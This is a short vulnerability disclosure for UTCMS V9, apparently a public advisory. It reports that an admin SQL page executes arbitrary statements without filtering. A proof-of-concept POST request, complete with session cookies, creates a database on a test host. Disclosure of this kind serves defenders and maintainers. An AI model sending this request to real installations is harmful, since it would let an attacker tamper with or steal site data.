# Vendor

HuangDou

# Product

UTCMS

# version

 V9

# Download 

https://gitee.com/usualtool/ut-cms

# Vulnerability

Execute any SQL statement

# Description

In the sql.php page, users can execute SQL query statements, but no results will be displayed. The problem is that there is no parameter filtering, and attackers can execute SELECT, CREATE, INSERT and other statements after logging into the backend.

# Analysis

In the app/modules/ut-data/admin/sql.php , users can execute SQL query statements, but no results will be displayed. The problem is that there is no parameter filtering, and attackers can execute SELECT, CREATE, INSERT and other statements after logging into the backend.
<img width="1219" alt="image" src="https://github.com/user-attachments/assets/dcb5f05a-22bc-4a03-a7b1-81d04955586e">
<img width="591" alt="image" src="https://github.com/user-attachments/assets/4208dce2-3d7b-4e1c-8dde-04e9eef4a155">
<img width="512" alt="image" src="https://github.com/user-attachments/assets/e1d34cba-2f31-4c8a-a2ff-a304016f5b1a">


# POC
```
POST /app/dev/?m=ut-data&p=sql&do=sql HTTP/1.1
Host: 192.168.17.24
Content-Length: 27
Cache-Control: max-age=0
Origin: http://192.168.17.24
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.17.24/app/dev/?m=ut-data&p=sql
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: LCMSCID=eNoBMADP_0xi_M4DSIoRPJX0GmjWp8P0dR_nRDrVaQtwMd_VebHzo4R6BzTlLJOsxv0ZZWuUZkyuGGA; Hm_lvt_e3403438a2b250ca086ee44c2c5ebf72=1723189774; Language=zh; PHPSESSID=7qa0p64kd90fjea6fqc2apnjr9
Connection: close

sql=create database mirage;
```
